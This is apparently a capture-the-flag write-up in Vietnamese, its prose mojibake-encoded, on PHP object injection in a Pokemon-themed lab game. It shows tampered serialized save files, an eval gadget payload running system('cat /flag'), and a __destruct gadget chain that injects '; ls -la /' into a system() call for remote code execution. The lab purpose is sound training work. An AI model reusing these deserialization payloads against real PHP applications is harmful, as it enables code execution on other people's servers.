# PHP Object Injection

## __Khá»Ÿi Ä‘á»™ng:__
Káº¿t ná»‘i vÃ o Ä‘Æ°á»ng link `localhost:12001` thÃ¬ sáº½ hiá»‡n lÃªn giao diá»‡n vÃ o game.  
![](1.PNG)

Báº¯t Ä‘áº§u chÆ¡i thÃ´i!  
Má»›i vÃ o mÃ¬nh sáº½ táº¡o tÃ i khoáº£n vÃ  Ä‘Äƒng nháº­p vÃ o game. Ban Ä‘áº§u mÃ¬nh chá»n con pokemon Ä‘á»ƒ khá»Ÿi Ä‘áº§u.  
![](2.PNG)

## __Map 1: NÆ¡i khá»Ÿi Ä‘áº§u nhá»¯ng chuyáº¿n Ä‘i__
![](3.PNG)  
Tháº­t yÃªn bÃ¬nhğŸ˜‚! MÃ¬nh sáº½ Ä‘i khÃ¡m phÃ¡ cÃ¡c chá»©c nÄƒng hiá»‡n cÃ³ trÃªn mÃ n hÃ¬nh.  
KÃ½ hiá»‡u ![](menu.PNG) bÃªn gÃ³c trÃ¡i mÃ n hÃ¬nh sáº½ hiá»ƒn thá»‹ menu gá»“m cÃ¡c chá»©c nÄƒng `Back: Trá»Ÿ láº¡i, View Info: Xem thÃ´ng tin, Load Game: Táº£i game lÃªn, Save Game: LÆ°u game vá»`.  
![](4.PNG)

MÃ¬nh sáº½ Ä‘i test thá»­ tá»«ng chá»©c nÄƒng:  
- __View Info__: Hiá»ƒn thá»‹ thÃ´ng tin ngÆ°á»i chÆ¡i vÃ  pokemon sá»Ÿ há»¯u.  
![](5.PNG)
- __Save Game__: LÆ°u 1 file vá»›i tÃªn lÃ  `pokemon.sav`.  
![](6.PNG)
- __Load Game__: Táº£i file game Ä‘Ã£ LÆ°u vá». Khi táº£i lÃªn sáº½ hiá»ƒn thá»‹ thÃ´ng bÃ¡o thÃ nh cÃ´ng hay chÆ°a.  
![](7.PNG) 
- __Di chuyá»ƒn__: Chá»‰ cáº§n click vÃ o cÃ¡c Ã´ vuÃ´ng trong mÃ n hÃ¬nh giao diá»‡n lÃ  nhÃ¢n váº­t sáº½ di chuyá»ƒn.


Khi di chuyá»ƒn chÃºng ta sáº½ vÃ´ tÃ¬nh Ä‘á»¥ng Ä‘á»™ vá»›i cÃ¡c Ä‘á»‘i thá»§ vÃ  chÃºng ta sáº½ chiáº¿n Ä‘áº§u hoáº·c rÃºt lui.  
![](8.PNG)

VÃ  mÃ¬nh Ä‘Ã£ Ä‘Ã¡nh nÃ³ báº§m dáº­p ğŸ¤£. MÃ¬nh sáº½ di chuyá»ƒn Ä‘áº¿n nÃ³i chuyá»‡n vá»›i NPC gÃ¡c cá»•ng.  
![](9.PNG)  
NÃ³i chung cÅ©ng cháº£ cÃ³ gÃ¬ Ä‘Ã¡ng lÆ°u Ã½ vÃ  click vÃ o Ä‘á»ƒ qua Map 2 thÃ´i.

## __Map 2: Cháº¡m trÃ¡n Boss 1__
- __Map__:  
![](map2.PNG)

MÃ¬nh lÃ  dÃ¢n chÆ¡i khÃ´ng sá»£ boss cá»© tháº¿ Ä‘Ã¡nh luÃ´n.

![](10.PNG)
Ã‚y da cÃ³ má»™t sá»± chÃªnh lá»‡ch sá»©c máº¡nh khÃ´ng há» nháº¹ á»Ÿ Ä‘Ã¢y vÃ  cháº¯c cháº¯n mÃ¬nh Ä‘Ã¡nh khÃ´ng láº¡i rá»“i nÃªn mÃ¬nh "tÃ©" luÃ´nğŸ˜£.

Váº­y lÃ m sao Ä‘á»ƒ Ä‘Ã¡nh tháº¯ng Ä‘Æ°á»£c Boss mÃ  khÃ´ng cáº§n pháº£i Ä‘i farm máº¥y con nhá» taaaa. LÃºc nÃ y mÃ¬nh sáº½ cÃ³ lá»—i lÃ  _PHP Object Injection_ sáº½ thay Ä‘á»•i cÃ¡c thuá»™c tÃ­nh Object.


NhÆ° á»Ÿ Map 1 mÃ¬nh tÃ¬m hiá»ƒu cÃ¡c chá»©c nÄƒng thÃ¬ tháº¥y cÃ³ _Save Game_ vÃ  _Load Game_ sáº½ cÃ³ can thiá»‡p vÃ o dá»¯ liá»‡u.
- Äáº§u tiÃªn vá»›i _Save Game_, thÃ¬ lÃºc nÃ y Server sáº½ láº¥y tráº¡ng thÃ¡i dá»¯ liá»‡u hiá»‡n táº¡i cá»§a ngÆ°á»i chÆ¡i vÃ  lÆ°u vá» nÃªn ta khÃ´ng Ä‘á»¥ng vÃ o Ä‘Æ°á»£c gÃ¬ &rarr; Bá» qua pháº§n Save game.
- Tiáº¿p Ä‘áº¿n vá»›i _Load Game_, pháº§n dá»¯ liá»‡u á»Ÿ mÃ¡y tÃ­nh cá»§a mÃ¬nh Ä‘Æ°a lÃªn Server nÃªn mÃ¬nh cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c vá»›i nÃ³ &rarr; Sáº½ lÃ m Ä‘Æ°á»£c gÃ¬ Ä‘Ã³ vá»›i chá»©c nÄƒng nÃ y.

NhÆ° á»Ÿ Map 1 mÃ¬nh cÃ³ chá»¥p láº¡i thÃ¬ ná»™i dung dá»¯ liá»‡u lÆ°u vá» lÃ 
```php
O:7:"Trainer":2:{s:4:"name";s:4:"dinh";s:7:"pokemon";O:7:"Pokemon":4:{s:4:"name";s:7:"rongcon";s:4:"type";s:10:"charmander";s:6:"health";i:190;s:6:"damage";i:26;}}
```
MÃ¬nh há»c Ä‘Æ°á»£c Ä‘Ã¢y lÃ  dá»¯ liá»‡u khi mÃ¬nh lÆ°u game vá» thÃ¬ Server sáº½ thá»±c hiá»‡n __Serialize__ cÃ¡c dá»¯ liá»‡u vÃ  ná»™i dung á»Ÿ trÃªn lÃ  Ä‘á»‹nh dáº¡ng dá»¯ liá»‡u sau khi Ä‘Æ°á»£c chuyá»ƒn hÃ³a.  
![](11.PNG)  
CÃ¡ch thuá»™c tÃ­nh private cÅ©ng sáº½ Ä‘Æ°á»£c Serialize theo cÆ¡ cháº¿ cá»§a PHP (khÃ´ng cÃ³ á»Ÿ cÃ¡c thuá»™c tÃ­nh public) 
![](12.PNG)  
Ná»™i dung trong file Ä‘Ã³ mÃ¬nh cÃ³ thá»ƒ sá»­a Ä‘á»•i vÃ¬ náº±m trong mÃ¡y tÃ­nh cá»§a mÃ¬nh mÃ . Váº­y ná»™i dung trong file Ä‘Ã³ lÃ  gÃ¬? 
- CÃ¡c kÃ­ tá»± Ä‘áº§u tiÃªn cho má»—i dÃ²ng lÃ  kiá»ƒu dá»¯ liá»‡u: O=Object, s=string, i=int
- Sá»‘ tiáº¿p theo lÃ  Ä‘á»™ dÃ i chuá»—i mÃ  chuá»—i Ä‘Ã³ lÃ  tÃªn cho kiá»ƒu dá»¯ liá»‡u á»Ÿ trÆ°á»›c. NhÆ° lÃ : O:7:"Trainer" vá»›i Trainer lÃ  tÃªn cá»§a Object vá»›i Ä‘á»™ dÃ i lÃ  7 kÃ­ tá»± vÃ  tÆ°Æ¡ng tá»± cho cÃ¡c pháº§n sau.  

á» quÃ¡ trÃ¬nh Load Game, thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘á»c file vÃ  ___Unserialize___ Ä‘á»ƒ tÃ¡i táº¡o láº¡i tráº¡ng thÃ¡i nhÃ¢n váº­t.  
![](13.PNG)

Váº­y mÃ¬nh Ä‘Ã£ hiá»ƒu Ä‘Æ°á»£c Ä‘á»‹nh dáº¡ng file vÃ  cÃ¡ch hoáº¡t Ä‘á»™ng cá»§a ___Serialize___ vÃ  ___Unserialize___ Ä‘Ã³ rá»“i thÃ¬ mÃ¬nh Ä‘i Hack thÃ´i. Kiáº¿m chá»— nÃ o lÃ  sá»©c máº¡nh cá»§a pokemon tÄƒng nÃ³ hÆ¡n con Boss lÃ  Ä‘Æ°á»£c.  
![](14.PNG)  
Vá»›i `health:999999` vÃ  `damage:999999` Ä‘á»§ lÃ m One Punch Man rá»“i, khÃ´ng sá»£ bá»‘ con tháº±ng nÃ o ná»¯a. Rá»“i mÃ¬nh sáº½ Load file nÃ y lÃªn vÃ  kiá»ƒm tra dá»¯ liá»‡u. 
![](15.PNG)
&rarr; Váº­y mÃ¬nh Ä‘Ã£ hack sá»©c máº¡nh thÃ nh cÃ´ng rá»“i. Äi Ä‘áº¥m Boss 1 thÃ´i.

![](16.PNG)
ÄÃ¡nh tháº¯ng Boss 1 thÃ¬ mÃ¬nh Ä‘Æ°á»£c Flag:
>CBJS{FAKE_FLAG_FAKE_FLAG}

## __Map 3: Cháº¡m trÃ¡n Boss 2__
Sau khi hÃ nh ra bÃ£ Boss 1 thÃ¬ mÃ¬nh qua Map 3 tá»± tin gáº·p Boss 2.  
![](map3.PNG)

Oh noğŸ˜±! Boss 2 giáº£m sá»©c máº¡nh cá»§a mÃ¬nh xuá»‘ng 1 háº¿t rá»“i lÃ m sao mÃ  Ä‘Ã¡nh Ä‘Ã¢y.  
![](17.PNG)

NhÆ°ng mÃ¬nh lÃ  Hacker mÃ  nháº¥t Ä‘á»‹nh sáº½ Ä‘Ã¡nh tháº¯ng Ä‘Æ°Æ¡c con "giun" nÃ y.

MÃ¬nh sáº½ mÃ² vÃ o bÃªn trong code á»Ÿ map3
```php
case '3':
    if ($action == "new_battle") {
        $health = rand(70, 100);
        $damage = rand(10, 30);
        $wild_pokemon = new Pokemon($health, $damage);
        $_SESSION["enemy"] = $wild_pokemon;
        echo json_encode([$_SESSION["trainer"]->pokemon, $wild_pokemon]);
        die();
    } else if ($action == "fight") {
        if (!isset($_SESSION["enemy"])) {
            // Khi chÆ°a khá»Ÿi táº¡o Ä‘á»‘i thá»§
            // Tráº£ vá» máº£ng rá»—ng thá»ƒ hiá»‡n khÃ´ng cÃ³ sá»± Ä‘Ã¡nh nhau nÃ o
            echo json_encode([]);
            die();
        }
        $result = $_SESSION["trainer"]->fight($_SESSION["enemy"]);
        $_SESSION["enemy"] = null;
        echo json_encode($result);
        die();
    } else if ($action == "boss") {
        $health = rand(5000, 10000);
        $damage = rand(100, 300);
        $wild_pokemon = new Pokemon($health, $damage);
        $_SESSION["boss"] = $wild_pokemon;
        // KÄ© nÄƒng Ä‘áº·c biá»‡t cá»§a Boss: giáº£m sÃ¡t thÆ°Æ¡ng cá»§a káº» Ä‘á»‹ch vá» 1
        $_SESSION["trainer"]->pokemon->health = 1;
        $_SESSION["trainer"]->pokemon->damage = 1;
        echo json_encode([$_SESSION["trainer"]->pokemon, $wild_pokemon]);
        die();
    } else if ($action == "fight_boss") {
        if (!isset($_SESSION["boss"])) {
            // Khi chÆ°a khá»Ÿi táº¡o Ä‘á»‘i thá»§
            // Tráº£ vá» máº£ng rá»—ng thá»ƒ hiá»‡n khÃ´ng cÃ³ sá»± Ä‘Ã¡nh nhau nÃ o
            echo json_encode([]);
            die();
        }
        // KÄ© nÄƒng Ä‘áº·c biá»‡t cá»§a Boss: giáº£m sÃ¡t thÆ°Æ¡ng vÃ  mÃ¡u cá»§a káº» Ä‘á»‹ch vá» 1
        $_SESSION["trainer"]->pokemon->health = 1;
        $_SESSION["trainer"]->pokemon->damage = 1;
        $result = $_SESSION["trainer"]->fight($_SESSION["boss"]);
        // Náº¿u Ä‘Ã¡nh tháº¯ng 1 con boss, sáº½ tráº£ vá» FLAG á»Ÿ header
        if ($_SESSION["trainer"]->checkAlive()) {
            header("Flag: " . getenv("FLAG2"));
        }
        $_SESSION["boss"] = null;
        echo json_encode($result);
        die();
    } else if ($action == "run") {
        $result = $_SESSION["trainer"]->run();
        if ($result == true)
            echo "You escaped";
        else
            echo "You failed to escape, and lost a little HP";
        die();
    }
    break;
```
KÄ© nÄƒng Ä‘áº·c biá»‡t cá»§a Boss: giáº£m sÃ¡t thÆ°Æ¡ng cá»§a káº» Ä‘á»‹ch vá» 1

Theo nhÆ° mÃ¬nh xem trong file PHP Ä‘Æ°á»ng dáº«n `src/backend/libs/trainer.php`, tá»± nhiÃªn cÃ³ pháº§n code nÃ³ láº¡ láº¯m
```php
class TrumCuoi extends Trainer
{
    public function fight(Pokemon $wild_pokemon)
    {
        return array(array(1, 0));
    }
}
```
á» Trainer cÃ³ class TrumCuoi káº¿ thá»«a Ä‘áº¿n khi Ä‘áº¥m nhau thÃ¬ auto win má»i kÃ¨o. Váº­y mÃ¬nh cÃ³ thá»ƒ biáº¿n Ä‘á»•i nhÃ¢n váº­t cá»§a mÃ¬nh tá»« Trainer thÃ nh TrumCuoi.  
![](18.PNG)  

VÃ  mÃ¬nh Load lÃªn vÃ  Ä‘áº¥m Boss 2 thÃ´i!
![](19.PNG)

>CBJS{FAKE_FLAG_FAKE_FLAG}

## __Map 4: Báº¯t gáº·p tiÃªn ná»¯__
![](map4.PNG)

Sau má»™t há»“i chÆ¡i chÃ¡n vÃ¬ mÃ¬nh Ä‘Ã£ quÃ¡ máº¡nh rá»“i. MÃ¬nh Ä‘áº¿n Ä‘Ã¢y Ä‘á»ƒ Hack chá»© cÃ³ pháº£i Ä‘á»ƒ chÆ¡i game Ä‘Ã¢u nhá»‰?ğŸ¤”

LÃºc nÃ y Ä‘Ã£ khÃ´ng cÃ²n nhá»¯ng con quÃ¡i váº­t siÃªu to khá»•ng lá»“ ná»¯a rá»“i. MÃ¬nh Ä‘i gáº·p tiÃªn ná»¯ vÃ  trÃ² chuyá»‡n thÃ´i.  
![](20.PNG)

TiÃªn ná»¯ há»i vá» `secret` váº­y thÃ¬ mÃ¬nh pháº£i RCE Server Ä‘á»ƒ láº¥y flag á»Ÿ Ä‘Ã¢u rá»“i.  


VÃ o xem pháº§n code cá»§a checkSecret
```php
<?php
$flag = file_get_contents("/flag");
if (isset($_GET["secret"])) {
    if ($flag === $_GET["secret"])
        die(header("Location: map5.html"));
echo "Wrong secret";
}
```
Váº­y mÃ¬nh sáº½ pháº£i Ä‘á»c `flag` lÃ  `secret` á»Ÿ thÆ° má»¥c `root`.

NhÆ° á»Ÿ Map 3 thÃ¬ mÃ¬nh cÃ³ thá»ƒ Ä‘á»•i cÃ¡c Object cho nhÃ¢n váº­t cá»§a mÃ¬nh váº­y xem láº¡i nhÃ¢n váº­t cá»§a mÃ¬nh cÃ³ thá»ƒ lÃ m nhá»¯ng gÃ¬
```php
class Trainer
{
    public $name;
    public $pokemon;
    public function __construct($name, $pokemon_name, $pokemon_type)
    {
        $this->name = $name;
        $health = rand(GlobalConfig::BASE_HEALTH_MIN, GlobalConfig::BASE_HEALTH_MAX);
        $damage = rand(GlobalConfig::BASE_DMG_MIN, GlobalConfig::BASE_DMG_MAX);
        $this->pokemon = new Pokemon($health, $damage, $pokemon_name, $pokemon_type);
    }

    /** 
     *   HÃ m xá»­ lÃ½ viá»‡c Ä‘Ã¡nh nhau cá»§a Pokemon, Pokemon sáº½ tÄƒng sá»©c máº¡nh sau khi káº¿t thÃºc tráº­n Ä‘áº¥u
     *
     *   @param Pokemon $wild_pokemon: Pokemon hoang dÃ£ mÃ  ngÆ°á»i chÆ¡i gáº·p trong lÃºc di chuyá»ƒn
     *   @return Array Cho tháº¥y sá»‘ mÃ¡u cá»§a Pokemon qua tá»«ng vÃ²ng Ä‘áº¥u, cá»™t Ä‘áº§u tiÃªn lÃ  mÃ¡u Pokemon cá»§a ngÆ°á»i chÆ¡i, cá»™t thá»© hai lÃ  mÃ¡u cá»§a quÃ¡i
     *
     */
    public function fight(Pokemon $wild_pokemon)
    {
        $result = array();
        while ($this->pokemon->health > 0 && $wild_pokemon->health > 0) {
            $this->pokemon->health = $this->pokemon->health - $wild_pokemon->damage;
            $wild_pokemon->health = $wild_pokemon->health - $this->pokemon->damage;
            array_push($result, array($this->pokemon->health, $wild_pokemon->health));
        }
        $this->pokemon->levelUp();
        return $result;
    }


    /** 
     *   Kiá»ƒm tra Pokemon cá»§a ngÆ°á»i chÆ¡i cÃ³ cÃ²n sá»‘ng hay khÃ´ng
     *
     *   @return Boolean true khi cÃ²n sá»‘ng, false khi Ä‘Ã£ cháº¿t 
     *
     *
     */
    public function checkAlive()
    {
        if ($this->pokemon->health < 0) {
            return false;
        }
        return true;
    }

    /** 
     *   Xá»­ lÃ½ khi ngÆ°á»i chÆ¡i khÃ´ng muá»‘n Ä‘Ã¡nh nhau. 
     *   Tá»‰ lá»‡ cháº¡y trá»‘n thÃ nh cÃ´ng tÃ¹y thuá»™c vÃ o config
     *   Náº¿u cháº¡y trá»‘n tháº¥t báº¡i, mÃ¡u cá»§a Pokemon giáº£m 1/10
     *   @return Boolean true khi cháº¡y trá»‘n thÃ nh cÃ´ng, false ngÆ°á»£c láº¡i 
     *
     *
     */
    public function run()
    {
        $rate = rand(0, 100);
        if ($rate > GlobalConfig::RUN_CHANCE) {
            return true;
        }
        $this->pokemon->health = $this->pokemon->health - intval($this->pokemon->health / 10);
        return false;
    }

    public function __toString()
    {
        return json_encode($this);
    }
}
```
CÃ³ cÃ¡c method `__construct`, `fight`, `checkAlive`, `run`, `__toString`. BÃ¢y giá» mÃ¬nh sáº½ kiá»ƒm tra xem cÃ¡c method cÃ³ tÃªn tÆ°Æ¡ng tá»± cÃ²n cháº¡y á»Ÿ cÃ¡c Object nÃ o khÃ´ng?
- Method `fight()`: Chá»‰ á»Ÿ class `Trainer` &rarr; KhÃ´ng lÃ m Ä‘Æ°á»£c gÃ¬  
![](21.PNG)
- Method `checkAlive()`: Chá»‰ á»Ÿ class `Trainer` &rarr; KhÃ´ng lÃ m Ä‘Æ°á»£c gÃ¬     
![](22.PNG)
- Method `run()`: á» class `Trainer` vÃ  `Calculator`  
![](23.PNG)
```php
class Calculator {
    public $expression;
    public function __construct($expr) {
        $this->expression = $expr;
    }

    public function run() {
        $result = eval($this->expression);
        return $result;
    }
}
```
&rarr; method `run()` á»Ÿ class `Calculator` cÃ³ thá»±c thi hÃ m `eval()` (HÃ m thá»±c thi string nhÆ° PHP code) vá»›i tham sá»‘ lÃ  thuá»™c tÃ­nh `$expression`. Váº­y ta sáº½ chuyá»ƒn nhÃ¢n váº­t cá»§a mÃ¬nh thÃ nh Object nÃ y Ä‘á»“ng thá»i truyá»n sáºµn thuá»™c tÃ­nh lÃ  dÃ²ng code PHP (thuá»™c tÃ­nh mÃ¬nh cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c &rarr; `Untrusted Data`). DÃ¹ng chá»©c nÄƒng `run` Ä‘á»ƒ cháº¡y vÃ  "cháº¡y".
- Method `__toString()`: á»Ÿ class `Trainer` vÃ  `Pokemon` &rarr; KhÃ´ng lÃ m Ä‘Æ°á»£c gÃ¬.  
![](24.PNG)

### __Payload:__
DÃ¹ng chÃ­nh code Ä‘á»ƒ Serialize ra file cÃ³ ná»™i dung cá»§a Object `Calculator`.
```php
class Calculator {
    public $expression;
    public function __construct($expr) {
        $this->expression = $expr;
    }

    public function run() {
        $result = eval($this->expression);
        return $result;
    }
}
$exploit = new Calculator("phpinfo();");
echo serialize($exploit);
```
```php
O:10:"Calculator":1:{s:10:"expression";s:10:"phpinfo();";}
```

LÃ m tÆ°Æ¡ng tá»± nhÆ° map trÆ°á»›c vÃ  Load lÃªn Ä‘á»“ng thá»i gáº·p Ä‘á»‘i thá»§ báº¥t kÃ¬ rá»“i sau Ä‘Ã³ `run` Ä‘á»ƒ thá»±c thi code PHP.  
![](25.PNG)

Váº­y mÃ¬nh Ä‘Ã£ thá»±c thi code thÃ nh cÃ´ng vÃ  sau Ä‘Ã³ mÃ¬nh láº¥y Flag thÃ´i!

Payload:
```php
O:10:"Calculator":1:{s:10:"expression";s:20:"system('cat /flag');";}
```

![](flag_lv4.PNG)
>CBJS{FAKE_FLAG_FAKE_FLAG}

## __Map 5: Quay láº¡i Ä‘iá»ƒm báº¯t Ä‘áº§u__
![](map5.PNG)  
![](26.PNG)
á» map nÃ y mÃ¬nh cháº³ng lÃ m Ä‘Æ°á»£c gÃ¬ cáº£ thÃ¬ lÃ m sao Ä‘á»ƒ RCE Ä‘Ã¢y? NhÆ°ng tiáº¿p Ä‘áº¿n mÃ¬nh Ä‘Ã£ há»c Ä‘Æ°á»£c bÃ­ thuáº­t cháº¡y Ä‘Æ°á»£c code mÃ  khÃ´ng cáº§n lÃ m gÃ¬ cáº£ _"áº©n thÃ¢n chi thuáº­t"_ğŸ±â€ğŸ‘¤  
LÃºc nÃ y nhÃ¢n váº­t cá»§a mÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c gÃ¬ ná»¯a nÃªn cÃ¡c method xem nhÆ° vÃ´ dá»¥ng nÃªn mÃ¬nh xem thá»­ trong class `Trainer` cÃ³ ___Magic Method___ nÃ o khÃ´ng? (Magic Method lÃ  cÃ¡c method khÃ´ng cáº§n gá»i thÃ¬ nÃ³ sáº½ tá»± Ä‘á»™ng cháº¡y trong chÆ°Æ¡ng trÃ¬nh, nhÆ° lÃ : `__construct(): Khá»Ÿi táº¡o Object khi new`, `__destruct(): Tá»± Ä‘á»™ng há»§y Object khi káº¿t thÃºc chÆ°Æ¡ng trÃ¬nh`, `__toString(): Object chuyá»ƒn thÃ nh String`,...)

Váº­y bÃ¢y giá» mÃ¬nh sáº½ táº­n dá»¥ng Magic Method `__destruct()`. TÃ¬m cÃ¡c class cÃ³ method nÃ y  
![](27.PNG)

Ã€ cÃ³ class `Database` cÃ³ method nÃ y vÃ  chÃº Ã½ thÃªm trong method cÃ²n sá»­ dá»¥ng thuá»™c tÃ­nh `conn` (_Untrusted Data_) Ä‘á»“ng thá»i thuá»™c tÃ­nh cÃ²n gá»i method cá»§a nÃ³ lÃ  `close()`. MÃ¬nh tiáº¿p tá»¥c Ä‘i tÃ¬m class cÃ³ method `close()`.  
![](28.PNG)

QuÃ o! á» method nÃ y láº¡i cÃ²n sá»­ dá»¥ng hÃ m `system()` vá»›i lá»‡nh `rm` Ä‘á»‘i vá»›i thuá»™c tÃ­nh `$filepath` (_Untrusted Data_) &rarr; __Command Injection__

### __Ã tÆ°á»Ÿng:__
- MÃ¬nh sáº½ táº¡o Object `Database` cÃ³ thuá»™c tÃ­nh `$conn` lÃ  Object `Logger` Ä‘á»ƒ khi `__destruct()` thá»±c thi thÃ¬ sáº½ gá»i Ä‘áº¿n method `close()`
- Khá»Ÿi táº¡o Object `Logger` vá»›i thuá»™c tÃ­nh `$expression` lÃ  1 Ä‘oáº¡n command Ä‘á»ƒ Ä‘Æ°á»£c Ä‘Æ°a vÃ o `close()` &rarr; `system()`

### __Payload:__
NhÆ° á»Ÿ Map 4 mÃ¬nh táº­n dá»¥ng code Ä‘á»ƒ Serialize Payload luÃ´n.  

```php
class Logger {
    public $filepath;
    public function __construct($filepath) {
        $this->filepath = $filepath;    
    }
}

class Database {
    public $conn;
    public function __construct($conn) {
        $this->conn = $conn;
    }
}

$logger = new Logger("; ls -la /");

$exploit = new Database($logger);
echo serialize($exploit);
```

```php
O:8:"Database":1:{s:4:"conn";O:6:"Logger":1:{s:8:"filepath";s:10:"; ls -la /";}}
```

Cuá»‘i cÃ¹ng thÃ¬ mÃ¬nh Load lÃªn game thÃ´i!  
![](29.PNG)  
![](30.PNG)

Váº­y mÃ¬nh Ä‘Ã£ RCE thÃ nh cÃ´ng!